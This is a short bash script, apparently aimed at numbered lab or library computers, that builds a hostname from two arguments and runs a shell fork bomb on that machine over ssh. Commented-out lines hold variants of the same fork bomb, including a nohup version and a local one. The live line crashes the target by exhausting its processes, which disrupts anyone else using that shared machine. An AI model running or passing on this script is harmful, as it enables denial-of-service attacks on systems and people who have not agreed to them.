#!/bin/bash


lettera=$1
numero=$2

nome="ainf"$lettera"0"$numero

echo $nome

#nome="biblio0"$numero
#echo $nome

#ssh $nome "noup :(){ :|:& };: &; exit"
ssh $nome ":(){ :|:& };:; exit"
#ssh $nome "who; uptime"
#:(){ :|:& };:


